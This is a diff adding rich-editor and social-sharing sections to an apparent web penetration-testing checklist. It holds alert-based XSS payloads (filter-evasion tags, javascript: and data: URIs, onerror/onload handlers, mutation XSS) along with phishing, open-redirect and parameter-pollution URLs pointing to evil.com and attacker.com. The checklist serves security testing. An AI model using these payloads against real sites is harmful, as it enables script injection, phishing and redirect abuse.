@@ -2692,3 +2692,158 @@ Toggle risk-assessment parameters directly inside the request payload—such as 
 
 </details>
 
+### Rich Editor&#x20;
+
+<details>
+
+<summary>Tag &#x26; Bracket Evasion (Structural Deficiencies)</summary>
+
+* [ ] **Malformed structural tags:** Test how the parser deals with unclosed or incorrectly nested tags that attempt to break out of paragraphs or divs:
+
+```html
+<</p>iframe src=javascript:alert()//
+<</p>script>alert(1)</script>
+```
+
+* [ ] **Unknown/Custom HTML tags:** Introduce modern or custom HTML tags (e.g., `<xss id=x onfocus=alert(1) tabindex=1>`) to see if the sanitization filter only checks a strict blocklist of standard dangerous tags like `<script>` or `<iframe>`.
+
+</details>
+
+<details>
+
+<summary>Built-In Link (<code>href</code>) Attribute Manipulation</summary>
+
+* [ ] **Arbitrary protocol schemes:** Test if the link generation tool allows non-standard or custom protocols that might execute or leak data:
+
+```html
+<a href="aaa:bbb">x</a>
+<a href="feed:javascript:alert(1)">x</a>
+```
+
+* [ ] **HTML entity encoding:** Attempt to obscure the `javascript:` pseudo-protocol using a mix of URL encoding, HTML entities, and structural tabs to trick string-matching filters:
+
+```html
+<a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
+<a href="javascript&#x3a;alert(1)">Click Me</a>
+```
+
+* [ ] **Data URIs:** Inject base64-encoded HTML documents via the `data:` protocol scheme within links or buttons:
+
+```html
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Here</a>
+```
+
+</details>
+
+<details>
+
+<summary>Media Embed &#x26; Image Source Abuse</summary>
+
+* [ ] **Broken source event handlers:** Insert standard media tags like images or videos, but explicitly break the source path to force the execution of error-handling attributes:
+
+```html
+<img src="invalid-image.jpg" onerror="alert(1)">
+<video src="x" onerror="javascript:alert(1)"></video>
+```
+
+* [ ] **Vector Graphic (SVG) scripts:** Upload or embed an inline SVG payload containing embedded script tags or event handlers:
+
+```html
+<svg onload=alert(1)>
+```
+
+</details>
+
+<details>
+
+<summary>Hyperlink Injection &#x26; Content Spoofing</summary>
+
+* [ ] **Phishing via Markdown/Hypertext:** Check if you can control the display text independently of the underlying destination URL to mask malicious routing completely:
+
+```markdown
+[Click on me to claim 100$ vouchers](https://evil.com)
+```
+
+* [ ] **Relative path hijacking:** If the application forces links to be relative, use directory traversal elements inside the link creation field to route users to unexpected application views or unauthenticated states:
+
+```html
+<a href="/../../logout">Click to view settings</a>
+```
+
+</details>
+
+<details>
+
+<summary>DOM-Based Mutation XSS (mXSS)</summary>
+
+* [ ] **Context switching variations:** Submit inputs that look completely benign to the initial server-side validator, but turn into executable payloads once processed, rewritten, or optimized by the client-side JavaScript rendering engine (e.g., innerHTML normalization quirks):
+
+```html
+<article><script><img src="x" onerror="alert(1)"></script></article>
+```
+
+</details>
+
+### Social Sharing Feature
+
+<details>
+
+<summary>HTTP Parameter Pollution (HPP) &#x26; Link Hijacking</summary>
+
+* [ ] **Parameter appending:** Locate a blog, article, or product page that contains social share buttons (Facebook, X/Twitter, LinkedIn, WhatsApp). Append URL parameters directly to the target page's URL to see if they are blindly passed into the share button's destination URL:
+
+{% code overflow="wrap" %}
+```http
+https://target.com/blog-post?&u=https://attacker.com&text=Check+this+out:https://attacker.com
+```
+{% endcode %}
+
+* [ ] **Duplicate parameter injection:** Supply duplicate parameters that match the internal sharing script names (e.g., `url`, `u`, `share_url`, `link`, `text`, `via`). Test how the backend parses them (e.g., whether it picks the first instance, the last instance, or concatenates them):
+
+```http
+https://target.com/share?url=https://target.com/valid&url=https://attacker.com
+```
+
+* [ ] **Override share metrics:** Check if you can pollute metadata parameters like `title`, `description`, `image`, or `thumbnail` to manipulate what appears in the preview card generated on social media platforms.
+
+</details>
+
+<details>
+
+<summary>Open Redirect via Share Redirection Endpoints</summary>
+
+* [ ] **Internal redirect wrapper manipulation:** Many applications use an internal tracking or routing endpoint before redirecting the user to the third-party social network (e.g., `https://target.com/redirect?to=facebook&url=...`). Test if you can change the `url` parameter to an external malicious domain to achieve a classic Open Redirect.
+* [ ] **Path traversal inside share parameters:** Try using relative paths or directory traversal vectors inside the share URL parameter to see if you can force the internal share router to navigate to sensitive internal endpoints:
+
+```http
+https://target.com/share?url=/../../logout
+```
+
+</details>
+
+<details>
+
+<summary>JavaScript/DOM-Based Parameter Extraction</summary>
+
+* [ ] **DOM parameter mining:** Inspect the page's client-side JavaScript. If the share buttons use `window.location.href` or `document.URL` dynamically to construct the share link, try injecting URL-encoded characters, hash fragments (`#`), or quotes to test for DOM-based Cross-Site Scripting (DOM XSS):
+
+```http
+https://target.com/post?utm_source="><script>alert(1)</script>
+```
+
+* [ ] **Hash character handling:** Test if appending an execution string or an alternate URL after a hash sign (`#`) gets parsed by the sharing script:
+
+```http
+https://target.com/post#url=https://attacker.com
+```
+
+</details>
+
+<details>
+
+<summary>Meta Tag Manipulation (SEO / Social Spoofing)</summary>
+
+* [ ] **Open Graph (OG) & Twitter Card injection:** If the application generates custom share links based on user input on the page (e.g., a custom quiz result page or dashboard share link), check if your input reflects inside the `<meta property="og:url">` or `<meta property="og:image">` tags. If it does, you can spoof the platform card to show an authentic thumbnail but route users to a completely different destination.
+
+</details>
+
